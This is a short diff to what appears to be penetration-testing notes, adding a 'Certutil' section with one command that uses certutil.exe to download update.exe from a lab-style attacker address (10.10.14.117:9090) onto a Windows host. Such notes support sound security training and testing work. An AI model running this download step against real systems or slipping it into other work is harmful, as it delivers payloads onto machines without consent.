@@ -220,3 +220,8 @@ Ethernet adapter Ethernet0:
 ```
 
 ```
+
+### Certutil
+```
+certutil.exe -f -urlcache -split http://10.10.14.117:9090/update.exe update.exe
+```
